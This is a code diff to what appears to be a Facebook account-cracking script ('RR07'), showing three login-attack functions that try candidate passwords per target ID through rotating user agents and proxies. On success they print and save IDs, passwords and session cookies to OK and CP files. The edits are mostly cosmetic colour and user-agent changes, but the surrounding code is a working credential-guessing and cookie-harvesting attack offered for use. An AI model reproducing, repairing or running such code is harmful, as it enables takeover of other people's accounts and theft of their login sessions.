@@ -1101,9 +1101,9 @@ def passwrd():
 def rr071(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{B}{loop}{x}/{M}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}")
+	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
-	ua = random.choice(ugen)
+	ua = random.choice(uaku2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1135,19 +1135,19 @@ def rr071(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} KUKIS : {H}{kuki}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} KUKIS : {H2}{kuki}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1159,9 +1159,9 @@ def rr071(idf,pwv):
 def rr072(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{B}{loop}{x}/{M}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}")
+	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
-	ua = random.choice(ugen)
+	ua = random.choice(uaku2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1177,16 +1177,16 @@ def rr072(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} KUKIS : {H}{kuki}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} KUKIS : {H2}{kuki}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1201,9 +1201,11 @@ def rr072(idf,pwv):
 #---------------------[ METODE-TOUCH-3 ]---------------------#
 def rr073(idf,pwv):
 	global loop,ok,cp
-	ua = random.choice(ugen)
+	ua = random.choice(uaku2)
 	ses = requests.Session()
-	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{B}{loop}{x}/{M}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}")
+	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.flush()
+	ses = requests.Session()
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
@@ -1234,19 +1236,19 @@ def rr073(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} KUKIS : {H}{kuki}")
-				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} KUKIS : {H2}{kuki}")
+				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
